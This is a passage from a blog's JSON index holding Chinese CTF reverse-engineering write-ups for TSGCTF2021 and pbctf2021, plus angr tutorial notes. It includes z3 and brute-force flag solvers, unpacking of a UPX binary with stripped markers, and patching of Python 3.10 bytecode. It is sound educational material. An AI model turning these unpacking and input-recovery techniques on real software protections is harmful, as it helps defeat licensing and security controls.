\u0026gt;\u0026gt; 7 != 0: array_5234[i] = array_5234[i] + 1 if array_5234[i] == target[i]: print (chr(j), end= \u0026#39;\u0026#39;) break else: print (\u0026#34;no\u0026#34;) ","date":"2021-11-23T14:06:23Z","permalink":"/post/resent-re-challenge/","title":"Resent RE Challenge"},{"content":"TSGCTF2021 Beginners Rev 用 fork() 遍历了 32 位输入，每个输入都分别进行一次函数运算\ndo { ++v2; if ( !fork() ) { v2 = 0; v1 |= 1 \u0026lt;\u0026lt; v3; v7 = open(\u0026#34;/dev/null\u0026#34;, 1); dup2(v7, 1); } ++v3; } while ( v3 != 5 ); 每个函数运算都是将输入迭代好多次\nv4 = (unsigned __int8 *)\u0026amp;key + a2; v5 = v4[2]; v6 = 1; while ( (unsigned int)(-1217102449 * v5 + 1217102449) \u0026gt; 0xB2927C ) { ++v6; v5 += v4[2]; if ( v6 == 367 ) { v6 = -1; break; } } v7 = v4[4]; v8 = v4[3] * ((a1 + *v4) % 367 * v4[1] % 367 * v6 % 367) % 367; 被retaddr坑了一会，后面才反应过来开头那个 if ( retaddr - (_BYTE *)check != 95 ) 的意思\n解法就是先将while循环内的运算解出来，然后用z3求解就行\nfrom z3 import * key = [ 0x9E, 0xA5, 0x43, 0x3C, 0x3D, 0xE5, 0x50, 0x95, 0x29, 0xFB, 0x03, 0x34, 0xF6, 0x6D, 0xF7, 0x9A, 0x5E, 0x8A, 0x6F, 0x0F, 0xAE, 0x6A, 0x78, 0x41, 0x02, 0x46, 0x8B, 0xAE, 0xB6, 0x83, 0x09, 0x4F, 0x54, 0x74, 0x8D, 0xF4, 0x79, 0xD2, 0xFE, 0x2D, 0x78, 0x1B, 0x11, 0x57, 0xB7, 0x9F, 0x4E, 0xC4, 0x52, 0x9E, 0xF5, 0xFF, 0x56, 0x71, 0x3C, 0x1B, 0x60, 0x22, 0x9C, 0x56, 0xA7, 0xCF, 0x8E, 0x45, 0x16, 0x5C, 0xA5, 0xF4, 0x28, 0xA0, 0x30, 0x57, 0xA5, 0xB1, 0xC9, 0xC4, 0x86, 0x3E, 0xB8, 0x13, 0x44, 0x4D, 0xBF, 0x97, 0xE4, 0x06, 0x96, 0x07, 0x8B, 0x9F, 0x52, 0x12, 0x92, 0xC6, 0xC0, 0x8A, 0x69, 0xF5, 0xA5, 0x9D, 0xF3, 0x3B, 0xB6, 0x99, 0x86, 0xD9, 0x67, 0x32, 0xB1, 0xBF, 0xB8, 0x2E, 0x58, 0x55, 0xB0, 0x9C, 0x65, 0x9E, 0x9F, 0xE3, 0xF0, 0xBF, 0xCF, 0xCD, 0xDE, 0xFD, 0x34, 0x31, 0x78, 0x55, 0x6E, 0x01, 0x74, 0xD7, 0xA8, 0x26, 0xFF, 0xD6, 0xCC, 0x99, 0x51, 0xFB, 0xF6, 0xF4, 0x03, 0xFA, 0x61, 0xDF, 0x41, 0x98, 0x0D, 0xBD, 0xBF, 0x88, 0x44, 0x5E, 0x56, 0xD2, 0xA9, 0x00 ] time = [ 0x127, 0x0ee, 0x07e, 0x068, 0x169, 0x0f2, 0x04e, 0x0ea, 0x0bc, 0x0ae, 0x0f5, 0x078, 0x114, 0x10a, 0x13b, 0x0ff, 0x052, 0x07d, 0x0cd, 0x031, 0x0fb, 0x142, 0x034, 0x060, 0x0b8, 0x0c2, 0x12d, 0x0fb, 0x0f4, 0x161, 0x0cc, 0x0df, 0x11c, 0x0c1, 0x0b1, 0x0b6, 0x05b, 0x0bb, 0x162, 0x105, 0x034, 0x044, 0x06c, 0x087, 0x16d, 0x151, 0x050, 0x117, 0x05e, 0x127, 0x003, 0x09a, 0x12f, 0x00d, 0x068, 0x044, 0x041, 0x036, 0x028, 0x12f, 0x0bd, 0x148, 0x0a8, 0x0fa, 0x13d, 0x004, 0x0ee, 0x0b6, 0x09c, 0x027, 0x082, 0x087, 0x0ee, 0x08d, 0x02a, 0x117, 0x03f, 0x094, 0x002, 0x03a, 0x01b, 0x08f, 0x062, 0x0af, 0x042, 0x132, 0x073, 0x069, 0x12d, 0x151, 0x05e, 0x066, 0x112, 0x04c, 0x0d8, 0x07d, 0x007, 0x003, 0x0ee, 0x0b4, 0x125, 0x038, 0x0f4, 0x00c, 0x03f, 0x0fc, 0x136, 0x159, 0x08d, 0x062, 0x002, 0x008, 0x0ab, 0x05f, 0x10d, 0x028, 0x102, 0x127, 0x151, 0x10e, 0x01a, 0x062, 0x148, 0x06f, 0x11e, 0x0eb, 0x078, 0x00f, 0x034, 0x05f, 0x165, 0x001, 0x0c1, 0x10c, 0x08e, 0x01d, 0x09a, 0x163, 0x009, 0x00c, 0x091, 0x0ae, 0x114, 0x0b6, 0x0f5, 0x045, 0x08c, 0x04f, 0x060, 0x063, 0x071, 0x0a7, 0x062, 0x0c5, 0x01b, 0x052, 0x12f, 0x0bb, 0x123, -1, ] enc = [ 185, 180, 193, 107, 325, 148, 254, 342, 56, 160, 338, 143, 58, 289, 362, 248, 319, 339, 92, 66, 248, 72, 21, 229, 122, 206, 101, 235, 113, 100, 45, 262 ] for i in range(len(enc)): s = Solver() a1 = Int(\u0026#34;a1\u0026#34;) s.add(a1 \u0026gt;= 0) s.add(a1 \u0026lt;= 128) v6 = time[i + 2] v8 = key[i + 3] * ((a1 + key[i + 0]) % 367 * key[i + 1] % 367 * v6 % 367) % 367 v9 = time[i + 4] v11 = time[i + 7] v12 = (95 + (((v9 * v8 % 367 + 367 - key[i + 5]) % 367 + 367 - key[i + 6]) % 367)) % 367 v13 = key[i + 9] * ((key[i + 8] + v11 * v12 % 367) % 367) v15 = time[i + 10] v16 = v13 % 367 v17 = v15 * v16 v19 = time[i + 11] v21 = (key[i + 16] + (key[i + 15] + key[i + 14] * (((key[i + 12] + v17 % 367 * v19 % 367) % 367 + 367 - key[i + 13]) % 367) % 367) % 367) % 367 v22 = time[i + 17] v24 = (key[i + 19] + key[i + 18] * (v21 * v22 % 367) % 367) % 367 v25 = time[i + 20] v26 = key[i + 28] + key[i + 27] * (((key[i + 25] + (key[i + 24] + key[i + 22] * ((v24 * v25 % 367 + 367 - key[i + 21]) % 367) % 367 * key[i + 23] % 367) % 367) % 367 + 367 - key[i + 26]) % 367) % 367 v28 = time[i + 30] v29 = 95 + v26 % 367 * key[i + 29] % 367 - 367 * ((95 + (v26 % 367 * key[i + 29] % 367)) / 367) v30 = (v29 * v28 % 367 + 367 - key[i + 31]) % 367 + 367 - key[i + 32] v32 = time[i + 33] v34 = key[i + 35] * ((key[i + 34] + v30 % 367 * v32 % 367) % 367) % 367 * key[i + 36] % 367 v35 = time[i + 37] v37 = (key[i + 43] * (((((key[i + 38] * (v34 * v35 % 367) % 367 + 367 - key[i + 39]) % 367 + 367 - key[i + 40]) % 367 + 367 - key[i + 41]) % 367 + 367 - key[i + 42]) % 0x16F) % 0x16F + key[i + 44]) % 0x16F v38 = time[i + 45] v40 = (key[i + 46] + (v37 * v38) % 367) % 367 v41 = time[i + 47] v43 = (key[i + 49] + (key[i + 48] + v40 * v41 % 367) % 367) % 367 v44 = time[i + 50] v46 = key[i + 55] * ((key[i + 54] + ((key[i + 52] + (key[i + 51] + v43 * v44 % 367) % 367) % 367 + 367 - key[i + 53]) % 367) % 367) % 367 v47 = time[i + 56] v49 = (v46 * v47 % 367 + 367 - key[i + 57]) % 367 v50 = time[i + 58] v52 = ((95 + v49 * v50 % 367) % 367 + key[i + 59]) % 367 v53 = time[i + 60] v54 = (key[i + 63] + key[i + 62] * ((key[i + 61] + v52 * v53 % 367) % 367) % 367) % 367 * key[i + 64] % 367 + 367 - key[i + 65] v56 = time[i + 67] v57 = v56 * ((key[i + 66] + v54 % 367) % 367) v59 = time[i + 68] v61 = (key[i + 69] * (v57 % 367 * v59 % 367) % 367 + 367 - key[i + 70]) % 367 v62 = time[i + 71] v64 = (key[i + 73] * (key[i + 72] * (v61 * v62 % 367) % 367) % 367 + 367 - key[i + 74]) % 367 v65 = time[i + 75] v67 = (v64 * v65 % 367 + 367 - key[i + 76]) % 367 v68 = time[i + 77] v70 = ((key[i + 79] + (v67 * v68 % 367 + 367 - key[i + 78]) % 367) % 367 + 367 - key[i + 80]) % 367 v71 = time[i + 81] v73 = key[i + 85] * (((key[i + 82] * (v70 * v71 % 367) % 367 + 367 - key[i + 83]) % 367 + 367 - key[i + 84]) % 367) % 367 v74 = time[i + 86] v76 = (v73 * v74 % 367 + 367 - key[i + 87]) % 367 v77 = time[i + 88] v78 = key[i + 90] * (((95 + v76 * v77 % 367) % 367 + 367 - key[i + 89]) % 367) v79 = time[i + 98] v82 = time[i + 99] v84 = ((v82 * ((v79 * (((((((v78 % 367 + 367 - key[i + 91]) % 367 * key[i + 92] % 367 + 367 - key[i + 93]) % 367 + 367 - key[i + 94]) % 367 + 367 - key[i + 95]) % 367 + 367 - key[i + 96]) % 0x16F + key[i + 97]) % 0x16F)) % 367) % 367 + 367 - key[i + 100]) % 367 + 367 - key[i + 101]) % 367 + 367 - key[i + 102] v85 = time[i + 108] v86 = 95 + ((((v84 % 367 + 367 - key[i + 103]) % 0x16F + key[i + 104]) % 0x16F + 367 - key[i + 105]) % 0x16F * key[i + 106] % 0x16F + 367 - key[i + 107]) % 0x16F - 367 * ((95 + (((((v84 % 367 + 367 - key[i + 103]) % 0x16F + key[i + 104]) % 0x16F + 367 - key[i + 105]) % 0x16F * key[i + 106] % 0x16F + 367 - key[i + 107]) % 0x16F)) / 367) v87 = key[i + 113] * (((((key[i + 109] + v86 * v85 % 367) % 367 + 367 - key[i + 110]) % 367 + 367 - key[i + 111]) % 367 + 367 - key[i + 112]) % 367) v89 = time[i + 114] v90 = v89 * (v87 % 367) v92 = time[i + 115] v93 = v90 % 367 * v92 v95 = time[i + 117] v97 = (key[i + 118] + (key[i + 116] + v93 % 367) % 367 * v95 % 367) % 367 v98 = time[i + 119] v100 = v97 * v98 % 367 v101 = time[i + 120] v103 = (v100 * v101 % 367 + 367 - key[i + 121]) % 367 v104 = time[i + 122] v105 = (key[i + 124] * ((key[i + 123] + v103 * v104 % 367) % 367) % 367 + 367 - key[i + 125]) % 367 * key[i + 126] v107 = time[i + 127] s.add(enc[i] == ((v105 % 367 * v107 % 367) + 95) % 367) if s.check() == sat: print (chr(s.model()[a1].as_long()), end = \u0026#39;\u0026#39;) else: print (\u0026#34;unsat\u0026#34;) print () 跑得倒是挺快，就是一行一行复制有点累\u0026hellip;\nnatural flag processing 队友查看了out的参数，发现只有第314位为1，于是猜测只要满足第314位输出大于0，就通过验证了（在 forward() 函数里加一行就验证了）\n先只输入 TSGCTF{ 测试了一下，然后惊奇地发现，每次运行完 forward() 后，都会有一位大于0，于是猜测错误的输入会使得大于0的位消失，且消失后无法再得到大于0，这样就可以爆破了，大于0的数字消失就剪掉\n队友用dfs，我就用了bfs，主要就是在之前的代码上进行一些魔改（感觉这个更像misc啊）\nimport string import torch from torch import nn FLAG_CHARS = string.ascii_letters + string.digits + \u0026#34;{}-\u0026#34; CHARS = \u0026#34;^$\u0026#34; + FLAG_CHARS def sanity_check(text): global FLAG_CHARS assert text[:7] == \u0026#34;TSGCTF{\u0026#34; assert text[-1:] == \u0026#34;}\u0026#34; assert all([t in FLAG_CHARS for t in text]) def embedding(text): global CHARS x = torch.zeros((len(text), len(CHARS))) for i, t in enumerate(text): x[i, CHARS.index(t)] = 1.0 return x class Model(nn.Module): def __init__(self, inpt, hidden): super().__init__() self.cell = nn.RNNCell(inpt, hidden) self.out = nn.Linear(hidden, 1) def forward(self, xs): count = 0 h = None global baopo global cur # print (xs) # print (\u0026#39;-------------------------------\u0026#39;) for x in xs[:-1]: count += 1 h = self.cell(x, h) if (len((h \u0026gt; 0).nonzero()) != 0): print (cur) baopo.append(cur) x = xs[-1] h = self.cell(x, h) return self.out(h) count = 0 def inference(model, text): model.eval() with torch.no_grad(): x = embedding(\u0026#34;^\u0026#34;+text+\u0026#34;$\u0026#34;).unsqueeze(1) y = model(x)[0].sigmoid().cpu().item() return y # baopo = [\u0026#39;mRNA-st4nDs-f0r-mANuaLLy-tun3d-RecurrEn7-N3uRAl-AutoM4toN}\u0026#39;] baopo = [\u0026#39;m\u0026#39;] while True: i = baopo.pop(0) for j in FLAG_CHARS: model = Model(len(CHARS), 520) model.load_state_dict(torch.load(\u0026#34;model_final.pth\u0026#34;)) # text = input(\u0026#34;input flag:\u0026#34;) # sanity_check(text) # for i in range(400): text = \u0026#39;TSGCTF{\u0026#39; + i + j # print (i, j) cur = i + j res = inference(model, text) if res \u0026gt; 0.5: print(\u0026#34;Congrats!\u0026#34;) exit(0) # print (cur) # else: # print (res) # print(\u0026#34;Wrong.\u0026#34;) 爆破的时间有点久\n*optimized 这道题的UPX特征被完全去除了，以至于比赛的时候只看出来了是个壳，但没发现是UPX壳（其实猜到了，但elf就有点懒了\u0026hellip;）\n只需要打开010，将所有的 tsg_ 修改为 UPX! 就行\n脱壳后发现就是简单的数学约束，例如\n_mm_movemask_epi8( _mm_cmpeq_epi8( _mm_slli_si128((__m128i)0x9569uLL, 8), _mm_slli_si128( (__m128i)(((0x2AF91 * (unsigned __int128)(0x5F50DDCA7B17LL * (unsigned __int64)v8)) \u0026gt;\u0026gt; 64) \u0026amp; 0x3FFFF), 8))) == 0xFFFF 去官网查了一下函数的定义，就是要求\n(__m128i)(((0x2AF91 * (unsigned __int128)(0x5F50DDCA7B17LL * (unsigned __int64)v8)) \u0026gt;\u0026gt; 64) \u0026amp; 0x3FFFF) == (__m128i)0x9569uLL 本来想用c或者汇编的，但128位一直会有一些问题，于是只好用python了\u0026hellip;\nfor i in range(0, 0xffffffff): if (0x9569 == (((i * 0x5F50DDCA7B17 \u0026amp; 0xffffffffffffffff) * 0x2AF91) \u0026gt;\u0026gt; 64) \u0026amp; 0x3FFFF) and (0x26CF2 == (((i * 0x4DC4591DAC8F \u0026amp; 0xffffffffffffffff) * 0x34AB9) \u0026gt;\u0026gt; 64) \u0026amp; 0x3FFFF): print (f\u0026#39;v8 = {i}\u0026#39;, hex(i)) if (0x20468 == (((i * 0x4AE11552DF1A \u0026amp; 0xffffffffffffffff) * 0x36B39) \u0026gt;\u0026gt; 64) \u0026amp; 0x3FFFF) and (0x3787A == (((i * 0x46680B140EFF \u0026amp; 0xffffffffffffffff) * 0x3A2D3) \u0026gt;\u0026gt; 64) \u0026amp; 0x3FFFF): print (f\u0026#39;v9 = {i}\u0026#39;, hex(i)) if (i * 0x4D935BBD3E0 \u0026amp; 0xffffffffffffffff \u0026lt; 0x4D935BBD3E0) and (0x5563 == (((i * 0x66B9B431B9ED \u0026amp; 0xffffffffffffffff) * 0x27DF9) \u0026gt;\u0026gt; 64) \u0026amp; 0x3FFFF): print (f\u0026#39;v10 = {i}\u0026#39;, hex(i)) if (i * 0x1E5D2BE81C5 \u0026amp; 0xffffffffffffffff \u0026lt; 0x1E5D2BE81C5) and (0x133E7 == (((i * 0x448626500938 \u0026amp; 0xffffffffffffffff) * 0x3BC65) \u0026gt;\u0026gt; 64) \u0026amp; 0x3FFFF): print (f\u0026#39;v11 = {i}\u0026#39;, hex(i)) if (i \u0026amp; 0xffffff == 0): print (f\u0026#39;time: {hex(i)}\u0026#39;) 跑亿会就行\n$ ./optimized-unpacked Enter password: 772928896 2204180909 4273479145 1334930147 TSGCTF{F457_m0dul0!}@ pbctf2021 cosmo main函数在 sub_403066\n要求长度是38，简单看了一下加密逻辑，发现是两个字符一起加密并验证，还想用pintools试试，结果发现根本跑不起来\n于是又开始了快乐的手写爆破，不过这个比较简单，动调一下就知道只用了最下面的几行加密逻辑\n#include \u0026lt;stdio.h\u0026gt; long long qword_40C000[20] = { 21233875ll, 69468586ll, 146735755ll, 251265871ll, 379651085ll, 536872170ll, 719455639ll, 924911196ll, 1158088491ll, 1412368333ll, 1695680674ll, 2005272944ll, 2341407284ll, 2698316511ll, 3076262773ll, 3483634782ll, 3913551105ll, 72486322ll, 548474478ll, 0ll }; long long encrypt(char *a, int len, int cur){ int v5 = len; int res = 0; long long v3 = qword_40C000[cur - 1]; int v6 = v3 \u0026gt;\u0026gt; 16; int v7 = v3 \u0026amp; 0xffff; while(v5){ v7 += *a; v6 += v7; --v5; ++a; } if (v7 \u0026gt; 0xFFF0) v7 -= 0xFFF1; return v7 | ((v6 % 0xFFF1) \u0026lt;\u0026lt; 16); } int test_cnt(int cnt){ for (int i = 0x20; i \u0026lt; 0x80; i++){ for (int j = 0x20; j \u0026lt; 0x80; j++){ char a[] = {i, j}; if (encrypt(a, 2, cnt) == qword_40C000[cnt]){ printf(\u0026#34;%c%c\u0026#34;, i, j); return 0; } } } } int main(){ printf(\u0026#34;pbctf{\u0026#34;); for (int i = 3; i \u0026lt; 19; i++) test_cnt(i); printf(\u0026#34;\\n\u0026#34;); return 0; } 除了找main函数之外也没有什么特别的\nBinaryTree 这题逻辑还是比较清晰的，就是根据800bit的输入进行了800层SMC\n每一层都会对寄存器进行一个加法，然后决定下一个SMC的结果，大概是\njz Label mov r8, [rdi + 0x____] ; 具体寄存器忘了，随便写了个，中间一堆nop省略了 add r9, 0x__ Label: mov r8, [rdi + 0x____] add r9, 0x__ jmp SMC 最后一层就是对寄存器进行cmp，小于等于某个值就行\n一开始还想着出题人仁慈一点，贪心就是最小（想直接用idapython自动跑），结果直接gg\n队友对每一层的可能性进行了遍历，发现每一层最多有16种可能\n于是这题就成了有向无环图求单源最短路径\n求解代码可以分成三个部分：从SMC结果提取关键数据，建图，跑SPFA\n其中SPFA是抄的，路径输出稍微修改一下就行\n#include \u0026lt;algorithm\u0026gt;#include \u0026lt;vector\u0026gt;#include \u0026lt;queue\u0026gt;#include \u0026lt;iostream\u0026gt;#include \u0026lt;cstdlib\u0026gt;#include \u0026lt;cstdio\u0026gt;#include \u0026lt;cmath\u0026gt;#include \u0026lt;cstring\u0026gt; using namespace std; #define INF 0xfffffff #define MAXN 16 * 800 + 5  struct Cur_smc{ char bytecode[0x30]; int depth; int len[2]; }; Cur_smc cur_smc_code[MAXN]; char smc_xor_code[0xFFFFF]; struct Edge{ int to; int len; int path; Edge(int to, int len, int path): to(to), len(len), path(path) {} }; vector \u0026lt;Edge\u0026gt; G[MAXN]; int dist[MAXN]; int FLAG_exist; bool my_strncmp(char *a, char *b, int length){ for (int i = 0; i \u0026lt; length; ++i){ if (a[i] != b[i]) return false; } return true; } int analysis_next(int cur, int direction){ // direction == 0 for bellow, direction == 1 for above  int i = 0; while (cur_smc_code[cur].bytecode[i] == \u0026#39;\\x90\u0026#39;){ ++i; } // pass \u0026#34;nop\u0026#34;  int end_left = 0; unsigned int index_xor = 0; int START = 0; int END = 0; if (cur_smc_code[cur].bytecode[i] == \u0026#39;\\x74\u0026#39;) // always starts as \u0026#34;jz label1\u0026#34;  end_left = cur_smc_code[cur].bytecode[++i] + (++i); if (direction == 1){ // if input bit is 1  START = 0; END = end_left; } else if (direction == 0){ // if input bit is 0  START = end_left; END = 0x20; } for (i = START; i \u0026lt; END; ++i){ // read \u0026#34;add r9, xx\u0026#34;  if (cur_smc_code[cur].bytecode[i] == \u0026#39;\\x49\u0026#39; \u0026amp;\u0026amp; cur_smc_code[cur].bytecode[i + 1] == \u0026#39;\\x83\u0026#39; \u0026amp;\u0026amp; cur_smc_code[cur].bytecode[i + 2] == \u0026#39;\\xC1\u0026#39;) cur_smc_code[cur].len[direction] = cur_smc_code[cur].bytecode[i + 3]; // read next key to SMC  if (cur_smc_code[cur].bytecode[i] == \u0026#39;\\x48\u0026#39; \u0026amp;\u0026amp; cur_smc_code[cur].bytecode[i + 1] == \u0026#39;\\x8D\u0026#39; \u0026amp;\u0026amp; cur_smc_code[cur].bytecode[i + 2] == \u0026#39;\\x5F\u0026#39;) index_xor = cur_smc_code[cur].bytecode[i + 3] \u0026amp; 0xff; if (cur_smc_code[cur].bytecode[i] == \u0026#39;\\x48\u0026#39; \u0026amp;\u0026amp; cur_smc_code[cur].bytecode[i + 1] == \u0026#39;\\x8D\u0026#39; \u0026amp;\u0026amp; cur_smc_code[cur].bytecode[i + 2] == \u0026#39;\\x9F\u0026#39;){ index_xor = cur_smc_code[cur].bytecode[i + 3] \u0026amp; 0xff; index_xor |= (cur_smc_code[cur].bytecode[i + 4] \u0026amp; 0xff) \u0026lt;\u0026lt; 8; index_xor |= (cur_smc_code[cur].bytecode[i + 5] \u0026amp; 0xff) \u0026lt;\u0026lt; 16; index_xor |= (cur_smc_code[cur].bytecode[i + 6] \u0026amp; 0xff) \u0026lt;\u0026lt; 24; } } char next_smc[0x30]; memset(next_smc, 0, sizeof(next_smc)); for (i = 0; i \u0026lt; 0x20; i++){ next_smc[i] = (char)(cur_smc_code[cur].bytecode[i] ^ smc_xor_code[index_xor + i]); } int next_depth = cur_smc_code[cur].depth + 1; for (i = (next_depth - 1) * 16; i \u0026lt; (next_depth) * 16; ++i){ if (cur_smc_code[i].depth == 0){ break; } if (my_strncmp(next_smc, cur_smc_code[i].bytecode, 0x20)){ FLAG_exist = 0; return i; } } FLAG_exist = 1; for (int j = 0; j \u0026lt; 0x20; j++){ cur_smc_code[i].bytecode[j] = next_smc[j]; } cur_smc_code[i].depth = next_depth; if (next_depth == 801){ FLAG_exist = 0; } return i; } void set_up_map(){ queue \u0026lt;int\u0026gt; Q; Q.push(0); while (!Q.empty()){ int tmp = Q.front(); Q.pop(); int left = analysis_next(tmp, 1); G[tmp].push_back(Edge(left, cur_smc_code[tmp].len[1], 1)); if (FLAG_exist) Q.push(left); int right = analysis_next(tmp, 0); G[tmp].push_back(Edge(right, cur_smc_code[tmp].len[0], 0)); if (FLAG_exist) Q.push(right); } return; } int Path[MAXN], flag[MAXN]; bool vis[MAXN]; void Spfa(int Start) { dist[Start] = 0; queue\u0026lt;Edge\u0026gt; Q; Q.push(Edge(Start, 0, 0)); while( !Q.empty() ) { Edge P = Q.front(); Q.pop(); vis[P.to] = true; int len = G[P.to].size(); for(int i=0; i\u0026lt;len; i++) { Edge Pn = G[P.to][i]; if(dist[Pn.to] \u0026gt; dist[P.to] + Pn.len) { dist[Pn.to] = dist[P.to] + Pn.len; Path[Pn.to] = P.to; flag[Pn.to] = Pn.path; if( !vis[Pn.to] ) { Q.push(Pn); vis[Pn.to] = true; } } } } } void PutPath(int Star,int End) { if(Star == End) return ; PutPath(Star, Path[End]); printf(\u0026#34;%d\u0026#34;, flag[End]); } void Init() { for(int i = 0; i \u0026lt; MAXN; i++) { G[i].clear(); dist[i] = INF; vis[i] = false; Path[i] = i; } FILE *fp = fopen(\u0026#34;smc_code.txt\u0026#34;, \u0026#34;r\u0026#34;); for (int i = 0; i \u0026lt; 0xC73E0; ++i){ smc_xor_code[i] = fgetc(fp); } } int main(){ Init(); printf(\u0026#34;\\n\u0026#34;); memcpy(cur_smc_code[0].bytecode, \u0026#34;\\x90\\x74\\x0D\\x48\\x8D\\x5F\\x40\\x90\\x49\\x83\\xC1\\x49\\xEB\\xC5\\x90\\x90\\x48\\x8D\\x5F\\x20\\x90\\x90\\x90\\x49\\x83\\xC1\\x11\\x90\\x90\\x90\\xEB\\xB3\u0026#34;, 0x21); cur_smc_code[0].depth = 1; set_up_map(); Spfa(0); printf(\u0026#34;%x\\n\u0026#34;, dist[16 * 800]); PutPath(0, 16 * 800); return 0; } 好久没有用c写这些东西了，一开始全是bug（\nswitchingitup 题目描述就说了是 python 3.10.0，一开始还以为没啥区别，结果发现pycdas只支持到了3.9，3.10连反汇编都出不来，好在pycdc的pull requests里有人提交了一份3.10的（现在已经更新了）差点考虑自己魔改pycdc了\n3.10加了一些新东西，一开始不知道看得很痛苦，后来查到之后感觉就不难了\n上一下目前手动反编译的结果\nimport dis def test_func(): @__import__(\u0026#39;dataclasses\u0026#39;).dataclass class a1: x: int y: str def key(v1): for e in v1: yield e ^ 1337 def gene(a): for e in a: yield e a1 = a1() a3 = bytes(key(iter((1385, 1403, 1402, 1389, 1407)))) a6 = __import__(\u0026#39;hashlib\u0026#39;).md5 I = input(\u0026#34;flag? \u0026#34;) a4 = lambda x: a6(x).hexdigest() a5 = list(I) a2 = {} a7 = -1 while a5: match a5: case [\u0026#39;p\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;{\u0026#39;, *R, \u0026#39;}\u0026#39;]: a7 = a7 + 1 a2 |= {0:112} if a7 or len(R) != 32 else {} a5 = list(gene(enumerate(R))) case a1(x, y): a7 = a7 + 1 a2 |= {x:y} if x + 1 != a7 or a4(a3 * x)[x] != y else {} case _: a2 |= {1:125} break print(\u0026#39;Correct\u0026#39; if not a2 else \u0026#39;Nope\u0026#39;) print (dis.dis(test_func)) 新的特性就是 match case 语句，感觉还是很实用的，学到了\n目前还有几个地方不太知道怎么写的\n一个是 a2 |= {} if () else {} 这里，题目里应该是把 a7=a7+1 放到了这一行里\n还有一个是 GET_ITER 和 FOR_ITER 在迭代部分是分开的，不太懂了\n不过仿照这这个逻辑写有些问题\n解决方案就是直接在 .pyc 文件里加一个输出，a4(a3 * x)[x] != y 给这个逻辑套上输出就行，改完后的pyasm文件长这样：\n 276 LOAD_NAME 12: a2 278 LOAD_NAME 13: a7 280 LOAD_CONST 21: 1 282 BINARY_ADD 284 DUP_TOP 286 STORE_NAME 13: a7 288 LOAD_NAME 18: x 290 LOAD_CONST 21: 1 292 BINARY_ADD 294 COMPARE_OP 3 (!=) 296 POP_JUMP_IF_TRUE 159 (to 318) --\u0026gt; LOAD_NAME 20: print 298 LOAD_NAME 9: a4 300 LOAD_NAME 4: a3 302 LOAD_NAME 18: x 304 BINARY_MULTIPLY 306 CALL_FUNCTION 1 308 LOAD_NAME 18: x 310 BINARY_SUBSCR --\u0026gt; CALL_FUNCTION 1 312 LOAD_NAME 19: y 314 COMPARE_OP 3 (!=) 316 POP_JUMP_IF_FALSE 163 (to 326) 然后还有手动修改一下各个 jump 的目的地址，最后的二进制文件长这样\n\r\n运行一下就有结果了\n\r\n","date":"2021-10-09T22:22:33Z","image":"/post/tsgctf2021-and-pbctf2021-re-writeups/cover_hu1d6e6a8c7a63b9144fd12b4cc4fa1275_1804782_120x120_fill_q75_box_smart1.jpg","permalink":"/post/tsgctf2021-and-pbctf2021-re-writeups/","title":"TSGCTF2021 and pbctf2021 RE writeups"},{"content":"开始学angr\n就是在抄solution\nfind from angr import * proj = Project(\u0026#39;./00_angr_find\u0026#39;, load_options={\u0026#39;auto_load_libs\u0026#39;: False}, main_opts={\u0026#39;base_addr\u0026#39;:0x8048000}) state = proj.factory.entry_state() simgr = proj.factory.simgr(state) find_addr = 0x8048675 simgr.explore(find = find_addr) if simgr.found: simulations = simgr.found[0] print (simulations.posix.dumps(0)) else: print (\u0026#39;no result\u0026#39;) 先用 Project 导入二进制文件\n然后 state 为开始模拟时的状态，entry_state 为从入口点开始模拟\nsimgr 是为 simulation_manager 导入这个状态，进行模拟执行\nexplore 为模拟器设定了一个执行的目标，遇到avoid将停止执行，遇到find则会添加到found状态中，这里填写的是输出 Success 字符串的地址\n最后从found中dumps出标准输入的值，就可以拿到flag\navoid from angr import * base_addr = 0x8048000 find_addr = 0x80485E0 avoid_addr = [0x80485A8, 0x80485F2] proj = Project(\u0026#39;./01_angr_avoid\u0026#39;, main_opts={\u0026#39;base_addr\u0026#39;: base_addr}) state = proj.factory.entry_state() simgr = proj.factory.simgr(state) simgr.explore(find = find_addr, avoid = avoid_addr) if simgr.found: simulation = simgr.found[0] print (simulation.posix.dumps(0)) else: print (\u0026#34;no result\u0026#34;) 没什么区别，就是增加了一个avoid参数\nfind condition from angr import * proj = Project(\u0026#39;./02_angr_find_condition\u0026#39;, main_opts={\u0026#39;base_addr\u0026#39;: 0x8048000}) state = proj.factory.entry_state() simgr = proj.factory.simgr(state) def find_condition(cur_state): output = cur_state.posix.dumps(1) return b\u0026#39;Good Job.\u0026#39; in output def avoid_condition(cur_state): output = cur_state.posix.dumps(1) return b\u0026#39;Try again.\u0026#39; in output simgr.explore(find=find_condition, avoid=avoid_condition) if simgr.found: print (simgr.found[0].posix.dumps(0)) else: print (\u0026#34;no result\u0026#34;) explore 中，可以将find和avoid的参数设置为函数，当各种输出太多的时候，这种方法比较省事，而且可拓展性很强\ndumps(1) 则是从状态中获取标准输出\nsymbolic registers symbolic的几个实验就是往初始状态里注入符号了\nfrom angr import * import claripy proj = Project(\u0026#39;./03_angr_symbolic_registers\u0026#39;, main_opts={\u0026#39;base_addr\u0026#39;:0x8048000}) after_input_addr = 0x8048980 state = proj.factory.blank_state(addr = after_input_addr) user_input = [claripy.BVS(\u0026#39;user_input_%d\u0026#39; % i, 32) for i in range(3)] state.regs.eax = user_input[0] state.regs.ebx = user_input[1] state.regs.edx = user_input[2] find_addr = 0x80489E9 avoid_addr = 0x80489D7 simgr = proj.factory.simgr(state) simgr.explore(find = find_addr, avoid = avoid_addr) if simgr.found: for a in user_input: print (\u0026#39;%x\u0026#39; % simgr.found[0].se.eval(a), end = \u0026#39; \u0026#39;) print () else: print (\u0026#34;no result\u0026#34;) claripy 是 angr 中的约束求解器，z3 好像就是fork出来的\n主要使用 state.regs.eax 之类的将符号注入到寄存器中\n这里用寄存器是因为输入被存储到了寄存器中\nmain 函数\n.text:0804897B call get_user_input .text:08048980 mov [ebp+var_14], eax ; state starts here .text:08048983 mov [ebp+var_10], ebx .text:08048986 mov [ebp+var_C], edx get_user_input 内部实现\n.text:0804892F call ___isoc99_scanf .text:08048934 add esp, 10h .text:08048937 mov ecx, [ebp+var_18] .text:0804893A mov eax, ecx .text:0804893C mov ecx, [ebp+var_14] .text:0804893F mov ebx, ecx .text:08048941 mov ecx, [ebp+var_10] .text:08048944 mov edx, ecx  写这题的时候，不小心把 blank_state 打成了 entry_state，但还是可以得到正确结果，不知道为啥\n 